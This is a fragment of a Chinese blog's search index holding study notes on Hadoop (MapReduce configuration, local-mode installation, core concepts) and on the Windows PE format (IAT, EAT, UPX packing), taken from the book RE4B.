对于Reduce，主要是把Map的结果尽可能地保存到内存中，同样也是要避免把中间结果写入磁盘。默认情况下，所有的内存都是分配给Reduce方法的，如果Reduce方法不怎么消耗内存，可以mapred.inmem.merge.threshold设成0，mapred.job.reduce.input.buffer.percent设成1.0 在任务监控中可通过Spilled records counter来监控写入磁盘的数，但这个值是包括map和reduce的 对于IO方面，可以Map的结果可以使用压缩，同时增大buffer size（io.file.buffer.size，默认4kb） 配置 属性 默认值 描述 io.sort.mb 100 映射输出分类时所使用缓冲区的大小. io.sort.record.percent 0.05 剩余空间用于映射输出自身记录.在1.X发布后去除此属性.随机代码用于使用映射所有内存并记录信息. io.sort.spill.percent 0.80 针对映射输出内存缓冲和记录索引的阈值使用比例. io.sort.factor 10 文件分类时合并流的最大数量。此属性也用于reduce。通常把数字设为100. min.num.spills.for.combine 3 组合运行所需最小溢出文件数目. mapred.compress.map.output false 压缩映射输出. mapred.map.output.compression.codec DefaultCodec 映射输出所需的压缩解编码器. mapred.reduce.parallel.copies 5 用于向reducer传送映射输出的线程数目. mapred.reduce.copy.backoff 300 时间的最大数量，以秒为单位，这段时间内若reducer失败则会反复尝试传输 io.sort.factor 10 组合运行所需最大溢出文件数目. mapred.job.shuffle.input.buffer.percent 0.70 随机复制阶段映射输出缓冲器的堆栈大小比例 mapred.job.shuffle.merge.percent 0.66 用于启动合并输出进程和磁盘传输的映射输出缓冲器的阀值使用比例 mapred.inmem.merge.threshold 1000 用于启动合并输出和磁盘传输进程的映射输出的阀值数目。小于等于0意味着没有门槛，而溢出行为由 mapred.job.shuffle.merge.percent单独管理. mapred.job.reduce.input.buffer.percent 0.0 用于减少内存映射输出的堆栈大小比例，内存中映射大小不得超出此值。若reducer需要较少内存则可以提高该值. ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:3:4","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"5. 编程 处理 select：直接分析输入数据，取出需要的字段数据即可 where: 也是对输入数据处理的过程中进行处理，判断是否需要该数据 aggregation:min, max, sum group by: 通过Reducer实现 sort join: map join, reduce join Third-Party Libraries # 第一种 export LIBJARS=$MYLIB/commons-lang-2.3.jar, hadoop jar prohadoop-0.0.1-SNAPSHOT.jar org.aspress.prohadoop.c3. WordCountUsingToolRunner -libjars $LIBJARS #第二种 hadoop jar prohadoop-0.0.1-SNAPSHOT-jar-with-dependencies.jar org.aspress.prohadoop.c3. WordCountUsingToolRunner The dependent libraries are now included inside the application JAR file 一般还是第一种的好，指定依赖可以利用Public Cache，如果是包含依赖，则每次都需要拷贝。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:3:5","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"四、参考文献 w3 school MapReduce Design Patterns ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:4:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"记录Hadoop的学习和漏洞分析过程","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(二)–环境搭建–本机模式 ","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/:0:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"前言 有条件的买一组服务器做集群，没有条件的配置高性能机器搭建虚拟机。此处以虚拟机进行搭建集群（多个Linux主机）。 第一次首先进行本机模式的Hadoop搭建。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/:1:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"一、虚拟机 centos7, 创建新用户，具有root权限。 在/opt目录下创建两个文件夹，分别为modules和software sudo mkdir modules sudo mkdir software ","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/:2:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"二、JAVA环境配置 centos7自带java环境，但自带的openjdk没有增加对java监控命令jps的支持，两种解决方案：卸载原有的openjdk进行再重装或者通过yum安装jdk开发插件。此处我们采用第一种解决方案： 下载Oracle版本JDK，jdk-7u67-linux-x64.tar.gz，并解压，然后配置好环境变量： tar -zxvf jdk-7u67-linux-x64.tar.gz -C /opt/modules export JAVA_HOME=/usr/local/jdk1.7.0_67 export PATH=$JAVA_HOME/bin:$PATH 对java环境进行验证： （务必确保java环境正确，java版本可以自行尝试，此处我使用了一个较老的版本） ","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/:3:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"三、Hadoop环境配置 下载Apache Hadoop，到官网下载即可，此处使用的是Hadoop-2.10.0（建议使用Binary，因为刚开始可能不熟悉源码编译）： 进入，然后选择一个链接点击下载，也可以直接使用wget下载： 下载后的文件建议放在/opt/modules下面一份，然后解压到/usr/local/路径下。 在.bashrc文件中配置Hadoop的环境变量： export HADOOP_HOME=/usr/local/hadoop-2.10.0 尝试运行：hadoop version 如果不报错，说明安装没有问题，可以跳过进入下面的验证，如果此处报错： ​ 运行其他的hadoop jar之类的命令也提示此问题，说明环境变量配置存在问题，可以尝试采用以下解决方式： ​ 在.bashrc中添加如下内容： export HADOOP_HOME=/usr/local/hadoop-2.10.0 #hadoop的环境变量，前面已经设置过 export HADOOP_INSTALL=$HADOOP_HOME export HADOOP_MAPRED_HOME=$HADOOP_HOME export HADOOP_COMMON_HOME=$HADOOP_HOME export HADOOP_HDFS_HOME=$HADOOP_HOME export YARN_HOME=$HADOOP_HOME export HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/native export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin export HADOOP_CONF_DIR=$HADOOP_HOME export HADOOP_PREFIX=$HADOOP_HOME export HADOOP_LIBEXEC_DIR=$HADOOP_HOME/libexec export JAVA_LIBRARY_PATH=$HADOOP_HOME/lib/native:$JAVA_LIBRARY_PATH export HADOOP_CONF_DIR=$HADOOP_PREFIX/etc/hadoop ​ 然后进行 source ~/.bashrc，此时再运行hadoop version进行验证： ","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/:4:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"四、环境验证 验证一个简单的Hadoop示例。 Hadoop安装提供了以下示例MapReduce jar文件，它提供了MapReduce的基本功能，可用于计算，如Pi值，文件列表中的字数等。 新建目录：mkdir /tmp/input 拷贝几个txt文件：cp $HADOOP_HOME/*.txt input 检查待测文件： ls -l input #输出 total 124 -rw-r--r-- 1 root root 106210 Mar 5 22:54 LICENSE.txt -rw-r--r-- 1 root root 15841 Mar 5 22:54 NOTICE.txt -rw-r--r-- 1 root root 1366 Mar 5 22:54 README.txt 运行命令进行每个可用文件的字数统计： hadoop jar $HADOOP_HOME/share/hadoop/mapreduce/hadoop-mapreduce-examples-2.10.0.jar wordcount input output 输出保存在output / part-r00000文件中，可以使用以下命令检查： cat output/* 检查结果如下所示： 因为检查文件不同可能结果不同，可以正常统计文件的字数即可。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/:5:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"五、总结 本机模式的安装配置相对简单，遇到错误网上搜一下基本都可以解决，需要根据自身配置进行不同的修改。后续将进行伪分布式和分布式环境的配置。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/:6:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"记录Hadoop的学习和漏洞分析过程","date":"2020-03-03","objectID":"/2020/03/Hadoop1/","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(一)–相关概念 本系列将从Hadoop学习到其漏洞复现分析进行完整记录。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:0:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"一、大数据 ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:1:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"1. 概念 Big Data：主要是指无法在一定范围内用常规润健工具进行捕捉、管理和处理的数据集合，需要新处理模式才能具有更强的决策力、洞察发现力和流程化能力的海量、高增长率和多样化的信息资产。一言概括：数据多到传统方案无法处理。 数据的体量并不是最重要，重要的是隐藏在数据中的信息的价值。(比如我们常见的大数据杀熟) ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:1:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"2. 单位 从小到大依次为： `bit``Byte``KB``MB``GB``TB``PB``EB``ZB``YB``BB``NB`和`DB` ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:1:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"3. 特点 大量：体量大 高速：处理数据的速度必须要快 多样：不同场景会产生不同的数据源 低价值密度：即使数据量很大，我们始终关注的应该只是特定的一部分，而并不是整体 ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:1:3","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"二、Hadoop ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:2:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"1. 概念 Hadoop是一个由Apache基金会所开发的分布式系统基础架构，主要用来解决大数据的存储和分析计算问题。现在已发展成为一个完整的生态技术，而不是单纯的Hadoop产品。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:2:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"2. 版本 Apache版本：最原始(最基础)的版本，对于入门学习最好，毕竟是出生地，血统也是最正的。(本系列文章主要专注于该版本) Cloudera ：在大型互联网企业中用的较多。 Hortonworks：文档比较全。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:2:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"3. 优势 高可靠性：底层使用多个数据副本(分布式存储的生动体现) 高扩展性：在集群间分配任务数据，可以方便的扩展数以千计的节点。 高效性：在MapReduce思想下，Hadoop被设计为并行工作 高容错性：能将失败的任务重新分配 ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:2:3","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"4. 组成部分 Hadoop 2.0之后，主要由以下四个部分组成： Common：其他Hadoop模块所需的Java库和实用程序。这些库提供文件系统和操作系统级抽象，并包含启动Hadoop所需的Java文件和脚本 Map-Reduce：计算 Yarn： 资源调度 HDFS： 数据存储 1. Map - Reduce编程模型 定义：分布式运算程序的编程框架，核心框架，主要功能是将用户编写的业务逻辑代码和自带默认组件整合成完整的分布式运算程序，并发运行在一个Hadoop集群上。 阶段：map阶段和reduce阶段，核心思想是将任务进行并行计算，分而治之，然后将结果汇总 2. Yarn 诞生于Hadoop 2.x阶段，主要负责资源调度(2.x之前，资源调度由map-reduce负责) 架构组成： ResourceManger(RM)：处理客户端请求、监控NodeManger、启动或监控ApplicationMaster、资源分配于调度 NodeManager(NM)：管理带个节点上的资源、处理来自RM的命令、处理来自AM的命令 ApplicationMaster(AM)：负责数据的切分、为应用程序申请资源并分配给内部的任务、任务的监控与容错 Container：Yarn中的资源抽吸那个，封装了某个节点上的多维度资源，如CPU、内存、磁盘、网络等 3. HDFS 概念：Hasdoop Distributed FIle System，Hadoop分布式文件系统，负责文件存储部分。 架构组成： NameNode(nn)：存储文件的元数据，如文件名、文件目录结构、文件属性(生成时间、副本数、文件权限)，以及每个文件的块列表和块所在的DataNode等 DataNode(dn)：在本地文件系统存储文件块数据，以及块数据的校验和。 Secondary NameNode(2nn)：监控HDFS状态的辅助后台程序，每隔一段时间获取HDFS元数据的快照。 对以上架构举例进行解释：在图书馆中，NameNode存储的是图书馆所有书籍的目录、作者、书的位置等信息，DataNode是存放书籍的书架，Secondary NameNode主要是存储每本书的副本，防止一本书损坏，没有其他的副本可用。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:2:4","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-03-02","objectID":"/2020/03/RE4B-4/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.4","uri":"/2020/03/RE4B-4/"},{"categories":["Tech"],"content":"PE文件格式详细解析（四）– 运行时压缩及UPX压缩调试 ","date":"2020-03-02","objectID":"/2020/03/RE4B-4/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.4","uri":"/2020/03/RE4B-4/"},{"categories":["Tech"],"content":"一、数据压缩 无损压缩（Lossless Data Compression）：经过压缩的文件能百分百恢复 使用经过压缩的文件之前，需要点对文件进行解压缩（此过程需要保证数据完整性），常见的ZIP、RAR等是具有嗲表性的压缩文件格式，使用的压缩算法通常为Run-Length、Lepel-ZIV、Huffman等。 有损压缩（Loss Data Compression）：经过压缩的文件不能恢复原状 允许压缩文件（数据）时损失一定信息，以此换取高压缩率，多媒体文件多采用有损压缩方式，但不会影响人的视觉、听觉体验。 ","date":"2020-03-02","objectID":"/2020/03/RE4B-4/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.4","uri":"/2020/03/RE4B-4/"},{"categories":["Tech"],"content":"二、运行时压缩器 ​ 针对可执行文件，文件内部含有解压缩代码，文件在运行瞬间于内存中解压缩后执行。 压缩器（Packer）：将普通PE文件创建成运行时压缩文件的应用程序 目的：缩减PE文件大小；隐藏PE文件内部代码与资源 种类：目的纯粹（UPX、ASPack等）、目的不纯粹（UPack、PESpin、NSAnti等） 保护器（Protector）：经反逆向技术特别处理的压缩器 目的：防止破解，隐藏OEP（Original Entry Point）；保护代码与资源 种类：商用（ASProtect、Themida、SVKP等）、公用（UltraProtect、Morphine等） ","date":"2020-03-02","objectID":"/2020/03/RE4B-4/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.4","uri":"/2020/03/RE4B-4/"},{"categories":["Tech"],"content":"三、运行时压缩测试（notepad.exe） ​ 书上使用的是XP SP3的notepad.exe，此处使用的是win7 x64下的notepad.exe ，因此部分数据会产生不同。 ### 1. 压缩notepad.exe 下载UPX，地址http://upx.sourceforge.net，进行解压，并将notepad.exe拷贝到同级目录下 进行压缩：upx.exe -o notepad_upx.exe notepad.exe 第一个参数为输出的文件名，第二个参数为待压缩文件名（如果不在同级目录下，需要使用绝对路径）。 压缩结果如下： 可以看到在文件大小上存在明显的尺寸减小（193536-\u003e151552）。这个压缩率比ZIP压缩要低一些，主要是因为PE文件压缩后要添加PE头，还要添加解压缩代码。 ","date":"2020-03-02","objectID":"/2020/03/RE4B-4/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.4","uri":"/2020/03/RE4B-4/"},{"categories":["Tech"],"content":"2. 比较notepad.exe与 notepad_upx.exe 下图(以书上版本为例)从PE文件视角比较2个文件，可以反映出UPX压缩器的特点： 细节比较： PE头大小一致（0～400h） 节区名发生变化（红框） 第一个节区的RawDataSize = 0（文件中的大小为0） EP文娱第二个节区，压缩前位于第一个节区 资源节区（.rsrc）大小几乎无变化 探讨UPX创建的空白节区，也就是RawDataSize=0的节区。使用PEView查看（此处为本机使用的notepad_upx.exe与书上不同）： 查看第一个节区的相关数据，VirtualSize的大小为2C000，但是SizeOfRawData的大小为0。UPX为什么要创建一个这么大的空白节区呢？ 原理是：经过UPX压缩的PE文件在运行时将首先将文件中的压缩代码解压到内存中的第一个节区，也就是说，解压缩代码与压缩代码的源代码都在第二个节区中，文件运行时首先执行解压缩代码，把处于压缩状态的源代码解压到第一个节区中，解压过程结束后即运行源文件的EP代码。 ","date":"2020-03-02","objectID":"/2020/03/RE4B-4/:3:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.4","uri":"/2020/03/RE4B-4/"},{"categories":["Tech"],"content":"四、总结 这里开始初步进入调试阶段，需要好好掌握前面的知识，方便后续调试。下一节将开始od的动态调试。 ","date":"2020-03-02","objectID":"/2020/03/RE4B-4/:4:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.4","uri":"/2020/03/RE4B-4/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-03-01","objectID":"/2020/03/RE4B-3/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"PE文件格式详细解析（三）–EAT ​ Windows操作系统中，库是为了方便其他程序调用而集中包含相关函数的文件（DLL、SYS）。Win32 API是最具有代表性的库，其中kernel32.dll文件被称为最核心的库文件。 ","date":"2020-03-01","objectID":"/2020/03/RE4B-3/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"一、基础知识 ​ EAT是一种核心机制，使不同的应用程序可以调用库文件中提供的函数，只有通过EAT才能准确求得从相应库中到处函数的起始地址。PE文件内的IMAGE_EXPORT_DIRECTORY保存着导出信息，且PE文件中仅有一个用来说明EAT的IMAGE_EXPORT_DIRECTORY结构体。 备注：IAT的 IMAGE_IMPORT_DESCRIPTOR结构体以数组形式存在，且有多个成员，这主要是因为PE文件可以同时导入多个库。 ","date":"2020-03-01","objectID":"/2020/03/RE4B-3/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"二、IMAGE_EXPORT_DIRECTORY结构体 ","date":"2020-03-01","objectID":"/2020/03/RE4B-3/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"1. 在PE头中的位置 ​ 在PE头中，IMAGE_OPTIONAL_HEADER32.DataDirectory[0].VirtualAddress的值几十IMAGE_EXPORT_DIRECTORY结构体数组的起始地址（RVA）。下图显示的是kernel32.dll文件的IMAGE_OPTIONAL_HEADER32.DataDirectory[0]: 其中第一个4字节为VirtualAddress，第二个4字节为Size。 ","date":"2020-03-01","objectID":"/2020/03/RE4B-3/:2:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"2. 详细的结构代码 详细的结构代码如下： 下面对结构体中的部分重要成员进行解释（全部地址均为RVA）： 项目 含义 NumberOfFuctions 实际Export函数的个数 NumberOFNames Export函数中具名的函数个数 AddressOfFunctions Export函数地址数组（数组元素个数=NumberOfFuctions） AddrssOfNames 函数名称地址数组（数组元素个数=NumberOfNames） AddressOfNameOrdinals Ordinal地址数组（元素个数=NumberOfNames） ","date":"2020-03-01","objectID":"/2020/03/RE4B-3/:2:2","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"3. kernel32.dll文件的IMAGE_EXPORT_DIRECTORY结构体 下图中描述的是kernel32.dll 文件的IMAGE_EXPORT_DIRECTORY结构体与整个的EAT结构： 从库中获得函数地址的API为GetProcAddress()函数，该API引用EAT来获取指定API的地址。其过程大致如下： 利用AddressOfName成员转到“函数名称数组” “函数名称数组”中存储着字符串地址，通过比较（strcmp）字符串，查找指定的函数名称（此时数组的索引称为name_index） 利用AddressOfNameOrdinals成员，转到ordinal数组 在ordinal数组中通过name_index查找相应ordinal值 利用AddressOfFunctionis成员转到“函数地址数组”（EAT） 在“函数地址数组”中将刚刚求得的ordinal用作数组索引，获得指定函数的起始地址 kernel32.dll中所有到处函数均有相应名称，AddressOfNameOrdinals数组的值以index=ordinal的形式存在。但存在一部分dll中的导出函数没有名称，所以仅通过ordinal导出，从Ordinal值中减去IMAGE_EXPORT_DIRECTORY.Base 成员后得到一个值，使用该值作为“函数地址数组”的索引即可查找到相应函数的地址。 ","date":"2020-03-01","objectID":"/2020/03/RE4B-3/:2:3","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"三、完整的kernel32.dll的EAT的解析过程 以下以查找kernel32.dll中的AddAtomW函数为例，串联整个过程： 由前面第一个图的VirtualAddress和Size可以获得IMAGE_EXPORT_DIRECTORY结构体的RAW为1A2C，计算过程如下： RAW = RVA - VA + PTR = 262C - 1000 + 400 = 1A2C(此处仅以书上地址为例，每个人地址会不同) 根据IMAGE_EXPORT_DIRECTORY结构的详细代码可以获得AddressOfNames成员的值为RVA =353C，RAW=293C。使用二进制查看软件查看该地址： 此处为4字节RVA组成的数组，数组元素个数为NumberOfNames（3BA）。 查找指定函数名称 函数名称为“ AddAtomW”，在上图中找到RVA数组的第三个元素的值RVA:4BBD -\u003e RAW:3FBD，进入相应地址即可看到该字符串，函数名为数组的第三个元素，数组索引为2. Ordinal数组 AddressOfNameOrdinals成员的值为RVA:4424 -\u003e RAW:3824: oridinal数组中各元素大小为2字节。 ordinal 将4中确定的index值2应用到数组即可求得Ordinal(2) AddressOfNameOrdinals[index] = ordinal(index = 2, ordinal = 2) 函数地址数组 - EAT AddressOfFunctions成员的值为RVA:2654 -\u003e RVA:1A54： AddAtomW函数地址 将5中求得的Ordinal用于上图数组的索引，求得RVA = 00326F1 AddressOfFunctionis[ordinal] = RVA(ordinal = 2,RVA = 326F1) 书中kernel32.dll 的ImageBase为7C7D0000，所以AddAtomW函数的实际地址VA = 7C7D0000 + 326F1 = 7C8026F1 以上地址可以使用od进行验证，此处不多赘述。 ","date":"2020-03-01","objectID":"/2020/03/RE4B-3/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-02-29","objectID":"/2020/03/RE4B-2/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"PE文件格式详细解析（二）–IAT IAT，导入地址表（Import Address Table），保存了与windows操作系统核心进程、内存、DLL结构等相关的信息。只要了理解了IAT，就掌握了Windows操作系统的根基。IAT是一种表格，用来记录程序正在使用哪些库中的哪些函数。 ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"一、DLL DLL，动态链接库（Dynamic Linked Library） ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"1. 来源 在16位的DOS环境中，不存在DLL的概念，例如在C中使用printf函数时，编译器会先从C库中读取相应函数的二进制代码，然后插入到应用程序中。但是Windows支持多任务，采用这种包含库的方式会没有效率，因为如果每个程序在运行时都将Windows库中的函数加载进来，将造成严重的内存浪费，因此引入了DLL的概念。 ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:1:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"2. 设计理念 不把函数库包含进应用程序中，单独组成DLL文件，在需要使用时再进行调用。 使用内存映射技术将加载后的DLL代码、资源在多个进程中实现共享。 在对函数库进行更新时，只更新DLL文件即可。 ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:1:2","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"3. 加载方式 DLL加载方式有两种：显式链接（Explicit Linking） 和 隐式链接（Implicit Linking） 显示链接：程序在使用DLL时进行加载，使用完毕后释放内存 隐式链接：程序在开始时即一同加载DLL，程序终止时再释放占用的内存 IAT提供的机制与DLL的隐式链接有关。 ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:1:3","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"二、DLL调用的简单理解 在OD中查看程序的反汇编代码如下所示: 在调用ThunRTMain()函数时，并非是直接调用函数，而是通过获取0x00405164地址处的值-0x7400A1B0，该值是加载到待分析应用程序进程内存中的ThunRTMain()函数的地址。 需要注意的是，此处之所以编译器不直接进行jmp 7400A1B0主要是因为以下两点： DLL版本不同，由于操作系统的版本存在差异，DLL文件版本也会存在差异 DLL重定位，DLL文件的ImageBase一般为0x10000000，如果应用程序同时有两个DLL文件需要加载–a.dll和b.dll，在运行时a.dll首先加载进内存，占到了0x10000000，此时b.dll如果再加载到0x10000000，就会发生冲突，所以需要加载到其他的空白内存空间处。 ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"三、IMAGE_IMPORT_DESCRIPTOR结构体 ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"1. 结构介绍 该结构体中记录着PE文件要导入哪些库文件，因为在执行一个程序时需要导入多个库，所以导入了多少库，就会存在多少IMAGE_IMPORT_DESCRIPTOR结构体，这些结构体组成数组，数组最后以NULL结构体结束。部分重要成员如下所示： 成员 含义 OriginalThunk INT的地址（RVA），4字节长整型数组，NULL结束 Name 库名称字符串的地址（RVA） FirstThunk IAT的地址（RVA），4字节长整型数组，NULL结束 下图描述了notepad.exe之kernel32.dll的IMAGE_IMPORT_DESCRIPTOR结构： ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:4:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"2. PE装载器把导入函数输入至IAT的顺序 读取IID的Name成员，获取库名称字符串（eg：kernel32.dll） 装载相应库： LoadLibrary(“kernel32.dll”) 读取IID的OriginalFirstThunk成员，获取INT地址 逐一读取INT中数组的值，获取相应IMAGE_IMPORT_BY_NAME地址（RVA） 使用IMAGE_IMPORT_BY_NAME的Hint（ordinal）或Name项，获取相应函数的起始地址： GetProcAddress(“GetCurrentThreadld”) 读取IID的FirstThunk（IAT）成员，获得IAT地址 将上面获得的函数地址输入相应IAT数组值 重复以上步骤4～7，知道INT结束（遇到NULL） ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:5:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"四、总结 IAT是在学习PE文件格式中重要的一部分，也是比较难的一部分，需要仔细学习，一定要熟练掌握。建议根据实际的PE文件结合前面的分析步骤，亲自动手多加分析，不断熟悉分析流程。 ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:6:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-02-28","objectID":"/2020/03/RE4B-1/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.1","uri":"/2020/03/RE4B-1/"},{"categories":["Tech"],"content":"PE文件格式详细解析（一） ","date":"2020-02-28","objectID":"/2020/03/RE4B-1/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.1","uri":"/2020/03/RE4B-1/"},{"categories":["Tech"],"content":"一、PE文件基本介绍 PE文件是Windows操作系统下使用的一种可执行文件，由COFF（UNIX平台下的通用对象文件格式）格式文件发展而来。32位成为PE32，64位称为PE+或PE32+。 ","date":"2020-02-28","objectID":"/2020/03/RE4B-1/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.1","uri":"/2020/03/RE4B-1/"},{"categories":["Tech"],"content":"二、PE文件格式 PE文件种类如下表所示： 种类 主扩展名 可执行系列 EXE, SCR 库系列 DLL, OCX, CPL, DRV 驱动程序系列 